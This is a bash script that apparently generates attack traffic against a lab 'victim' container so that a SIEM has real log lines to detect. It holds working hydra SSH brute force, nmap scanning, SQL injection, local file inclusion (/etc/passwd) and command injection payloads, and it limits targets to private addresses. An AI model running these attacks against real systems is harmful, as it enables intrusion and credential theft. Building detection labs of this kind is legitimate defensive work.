#!/bin/bash
# Executes ONE real attack against a compose-network target and exits.
#
# Usage: run_attack.sh <technique> <target> [port]
#
# Every technique below performs genuine network traffic against the victim's
# own daemons (sshd, Apache, PHP-FPM, MySQL). The victim writes the log lines;
# nothing here fabricates events and nothing here talks to the SIEM ingest API.
#
# Scope guard: only bare service names or private/compose addresses are
# accepted, so this image cannot be pointed at the internet or a LAN host.
set -u

TECHNIQUE="${1:-ssh_bruteforce}"
TARGET="${2:-victim}"
PORT="${3:-80}"

case "$TARGET" in
  *[!a-zA-Z0-9.\-]*|"")
    echo "refusing: invalid target '$TARGET'" >&2
    exit 2
    ;;
esac

# Resolve and refuse anything that is not a private address.
RESOLVED="$(getent hosts "$TARGET" | awk '{print $1}' | head -n1)"
if [ -n "$RESOLVED" ]; then
  case "$RESOLVED" in
    10.*|127.*|172.1[6-9].*|172.2[0-9].*|172.3[01].*|192.168.*) ;;
    *)
      echo "refusing: $TARGET resolves to public address $RESOLVED" >&2
      exit 3
      ;;
  esac
fi

WORDS="/usr/share/wordlists/lab-passwords.txt"
mkdir -p "$(dirname "$WORDS")"
printf '%s\n' wrong1 wrong2 demo-lAB-pass toor-lAB-demo admin123 hunter2 > "$WORDS"
USERS="/usr/share/wordlists/lab-users.txt"
printf '%s\n' root demo admin nobody > "$USERS"

BASE="http://$TARGET:$PORT"

# Attacker UA strings: the web rules match on them (sqlmap, nikto, hydra).
UA_SCAN="sqlmap/1.7 (http://sqlmap.org)"
UA_BROWSER="Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
UA_HYDRA="Mozilla/4.0 (Hydra)"

echo "[attacker] technique=$TECHNIQUE target=$TARGET:$PORT resolved=${RESOLVED:-?}"

case "$TECHNIQUE" in
  # ── Credential access over SSH: real sshd, real auth.log ──────────────────
  ssh_bruteforce)
    hydra -L "$USERS" -P "$WORDS" -t 4 -f -s "$PORT" \
      -o /tmp/hydra.out \
      "ssh://$TARGET" >/dev/null 2>&1 || true
    ;;

  ssh_invalid_user)
    # Real sshd attempts against non-existent accounts: sshd logs
    # "Failed password for invalid user <name>" itself.
    for u in ghost svcbackup oracle postgres monitor; do
      timeout 3 ssh -o StrictHostKeyChecking=no -o ConnectTimeout=2 -p "$PORT" \
        -o PreferredAuthentications=password -o PubkeyAuthentication=no \
        -o NumberOfPasswordPrompts=1 "$u@$TARGET" true >/dev/null 2>&1 || true
    done
    ;;

  # ── Network discovery ────────────────────────────────────────────────────
  port_scan)
    nmap -Pn -p 1-1024 --max-retries 1 --host-timeout 30s "$TARGET" >/dev/null 2>&1 || true
    ;;

  # ── Web discovery: 404s/403s in Apache access.log ─────────────────────────
  web_scan)
    for p in /admin/ /.env /wp-login.php /phpmyadmin/ /.git/config /server-status \
             /index.php /staff.php /login.php /gallery.php; do
      curl -s -o /dev/null -m 5 -A "$UA_SCAN" "$BASE$p" || true
    done
    ;;

  # ── Credential stuffing against the real PHP login form ──────────────────
  # login.php answers 401 for bad creds, so access.log carries a 401 trail.
  web_bruteforce)
    for i in $(seq 1 10); do
      curl -s -o /dev/null -m 5 -X POST -A "$UA_HYDRA" \
        -d "username=admin&password=guess$i" \
        "$BASE/login.php" || true
    done
    for u in root editor admin; do
      curl -s -o /dev/null -m 5 -X POST -A "$UA_HYDRA" \
        -d "username=$u&password=admin123" \
        "$BASE/login.php" || true
    done
    ;;

  # ── SQL injection on staff.php (concatenated into the query) ─────────────
  # The queries reach MySQL and produce PHP warnings in error.log.
  sqli_union)
    for payload in "1 UNION SELECT 1,2,3" "1 UNION SELECT username,password,email FROM staff" \
                   "1 OR 1=1" "-1 UNION SELECT id,username,password FROM staff"; do
      curl -s -o /dev/null -m 6 -A "$UA_SCAN" -G \
        --data-urlencode "id=$payload" "$BASE/staff.php" || true
    done
    ;;

  sqli_timeblind)
    for payload in "1 AND SLEEP(3)" "1' AND SLEEP(3)-- " "1 AND BENCHMARK(5000000,MD5(1))"; do
      curl -s -o /dev/null -m 8 -A "$UA_SCAN" -G \
        --data-urlencode "id=$payload" "$BASE/staff.php" || true
    done
    ;;

  # ── Local file inclusion on gallery.php (file_get_contents/include) ──────
  lfi)
    for payload in "../../../../etc/passwd" "/etc/passwd" \
                   "php://filter/convert.base64-encode/resource=index" \
                   "../../../../var/log/auth.log"; do
      curl -s -o /dev/null -m 6 -A "$UA_SCAN" -G \
        --data-urlencode "page=$payload" "$BASE/gallery.php" || true
    done
    ;;

  # ── Command injection probes on a contact form path ──────────────────────
  cmd_injection)
    for payload in "; id" "| whoami" "\$(uname -a)" "\`id\`"; do
      curl -s -o /dev/null -m 6 -A "$UA_SCAN" -G \
        --data-urlencode "q=$payload" "$BASE/contact.php" || true
    done
    ;;

  # ── Raw-request flood: protocol garbage in Apache error.log ──────────────
  bad_requests)
    for raw in \
      "GET /../../../../etc/passwd HTTP/1.1" \
      "POST /index.php HTTP/1.1" \
      "GET /%00 HTTP/1.1" \
      "OPTIONS * HTTP/1.1"; do
      printf '%s\r\nHost: %s\r\nUser-Agent: %s\r\nConnection: close\r\n\r\n' \
        "$raw" "$TARGET" "$UA_SCAN" | timeout 4 nc "$TARGET" "$PORT" >/dev/null 2>&1 || true
    done
    ;;

  *)
    echo "unknown technique: $TECHNIQUE" >&2
    exit 4
    ;;
esac

echo "[attacker] done technique=$TECHNIQUE"
